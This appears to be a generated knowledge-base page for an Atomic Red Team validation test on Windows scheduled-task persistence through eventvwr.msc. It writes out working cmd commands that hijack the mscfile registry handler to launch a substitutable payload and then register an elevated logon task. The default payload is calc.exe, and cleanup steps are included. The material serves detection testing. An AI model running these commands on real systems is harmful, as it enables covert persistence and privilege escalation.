---
atomic_guid: "02124c37-767e-4b76-9383-c9fc366d9d4c"
title: "Scheduled Task Persistence via Eventviewer.msc"
framework: "atomic"
generated: "true"
attack_technique_id: "T1053.005"
attack_technique_name: "Scheduled Task/Job: Scheduled Task"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "02124c37-767e-4b76-9383-c9fc366d9d4c"
  - "Scheduled Task Persistence via Eventviewer.msc"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Scheduled Task Persistence via Eventviewer.msc

Adds persistence by abusing `eventviewer.msc` via a scheduled task.
When the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`).

## Metadata

- Atomic GUID: 02124c37-767e-4b76-9383-c9fc366d9d4c
- Technique: T1053.005: Scheduled Task/Job: Scheduled Task
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1053.005/T1053.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1053-scheduled_task_job|T1053.005]]

## Input Arguments

### payload

- description: Command you want the task to execute
- type: string
- default: calc.exe

### task_name

- description: Name of the newly-created scheduled task
- type: string
- default: EventViewerBypass

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f
schtasks /Create /TN "#{task_name}" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F
ECHO Let's run the schedule task ...
schtasks /Run /TN "EventViewerBypass"
```

### Cleanup

```cmd
reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
schtasks /Delete /TN "#{task_name}" /F
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml)
